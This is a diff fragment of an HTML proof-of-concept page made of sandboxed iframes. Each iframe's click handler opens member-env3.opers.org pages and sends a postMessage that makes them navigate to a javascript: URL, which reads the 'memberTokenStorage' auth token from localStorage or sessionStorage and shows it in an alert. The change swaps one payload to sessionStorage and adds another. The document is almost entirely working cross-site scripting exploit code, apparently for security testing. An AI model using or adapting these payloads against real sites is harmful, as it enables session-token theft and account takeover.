@@ -12,7 +12,9 @@
 
     <iframe sandbox="allow-scripts allow-popups allow-modals " srcdoc='&lt;script>function r(){var j = window.open("//member-env3.opers.org/member/home"); setTimeout(()=>{j.postMessage(JSON.stringify({action: "href",url: "javascript:alert(localStorage.getItem(&apos;memberTokenStorage&apos;))"}), "*")}, 3000)};window.onclick=r&lt;/script>Click Me Member'></iframe>
 
-    <iframe sandbox="allow-scripts allow-popups allow-modals " srcdoc='&lt;script>function r(){var j = window.open("//member-env3.opers.org/auth/login"); setTimeout(()=>{j.postMessage(JSON.stringify({action: "href",url: "javascript:alert(localStorage.getItem(&apos;memberTokenStorage&apos;))"}), "*")}, 3000)};window.onclick=r&lt;/script>Click Me Login'></iframe>
+    <iframe sandbox="allow-scripts allow-popups allow-modals " srcdoc='&lt;script>function r(){var j = window.open("//member-env3.opers.org/auth/login"); setTimeout(()=>{j.postMessage(JSON.stringify({action: "href",url: "javascript:alert(sessionStorage.getItem(&apos;memberTokenStorage&apos;))"}), "*")}, 3000)};window.onclick=r&lt;/script>Click Me Login'></iframe>
+
+    <iframe sandbox="allow-scripts allow-popups allow-modals " srcdoc='&lt;script>function r(){var j = window.open("//member-env3.opers.org/auth/login"); setTimeout(()=>{j.postMessage(JSON.stringify({action: "href",url: "javascript:alert(sessionStorage.getItem(&apos;memberTokenStorage&apos;))"}), "*")}, 3000)};window.onclick=r&lt;/script>Click Me session'></iframe>
 
     <iframe sandbox="allow-scripts allow-popups allow-modals " srcdoc='&lt;script>function r(){var j = window.open("//member-env3.opers.org/auth/login"); setTimeout(()=>{j.postMessage(JSON.stringify({action: "href",url: "javascript:alert(1)"}), "*")}, 3000)};window.onclick=r&lt;/script>Click Me for Alert'></iframe>
 
